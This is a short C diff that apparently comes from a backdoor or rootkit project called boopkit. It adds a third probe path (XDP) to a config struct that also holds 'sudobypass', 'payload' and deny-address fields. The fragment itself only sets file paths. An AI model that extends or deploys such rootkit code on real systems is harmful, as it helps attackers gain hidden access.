@@ -115,6 +115,7 @@ struct config {
   int sudobypass;
   char pr0besafepath[PATH_MAX];
   char pr0bebooppath[PATH_MAX];
+  char pr0bexdppath[PATH_MAX];
   int denyc;
   int payload;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
@@ -128,9 +129,11 @@ void clisetup(int argc, char **argv) {
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
     strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
+    strncpy(cfg.pr0bexdppath, PROBE_XDP, sizeof PROBE_XDP);
   } else {
     sprintf(cfg.pr0besafepath, "%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
     sprintf(cfg.pr0bebooppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
+    sprintf(cfg.pr0bexdppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_XDP);
   }
   for (int i = 0; i < argc; i++) {
     if (argv[i][0] == '-') {
